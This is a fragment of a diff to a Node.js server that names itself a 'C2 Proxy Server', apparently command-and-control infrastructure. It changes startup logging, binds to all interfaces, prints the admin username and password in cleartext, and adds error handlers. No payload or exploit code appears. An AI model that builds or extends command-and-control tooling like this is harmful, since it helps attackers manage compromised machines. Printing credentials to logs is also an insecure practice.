+</html>
+    `);
+});
 
 // ==================== START SERVER ====================
 
-server.listen(PORT, async () => {
-    console.log('🚀 Puter C2 Proxy Server v2.0.0');
-    console.log(`📡 Running on port ${PORT}`);
+server.listen(PORT, '0.0.0.0', async () => {
+    console.log('🚀 Advanced C2 Proxy Server v3.0.0');
+    console.log('📡 Running on Render.com');
     console.log(`🔐 Encryption: AES-256-GCM`);
-    console.log(`💾 Storage: Puter Key-Value`);
-    console.log(`🤖 AI Integration: ${(await puter.ai).available ? '✅' : '❌'}`);
+    console.log(`💾 Storage: In-Memory + Disk Persistence`);
     console.log(`🌐 WebSocket: ws://localhost:${PORT}`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
     console.log('');
-    console.log('🔑 Admin password:', ADMIN_PASSWORD);
+    console.log('🔑 Admin Login:');
+    console.log(`   Username: ${ADMIN_USERNAME}`);
+    console.log(`   Password: ${ADMIN_PASSWORD}`);
+    console.log('');
+    console.log('📋 To get admin token, login via dashboard or use:');
+    console.log('   POST /api/admin/login');
+    console.log('   { "username": "' + ADMIN_USERNAME + '", "password": "' + ADMIN_PASSWORD + '" }');
 });
+
+// ==================== ERROR HANDLING ====================
+
+process.on('uncaughtException', (err) => {
+    console.error('❌ Uncaught Exception:', err.message);
+    console.error(err.stack);
+});
+
+process.on('unhandledRejection', (err) => {
+    console.error('❌ Unhandled Rejection:', err.message);
+});
+
+console.log('✅ Server initialization complete');
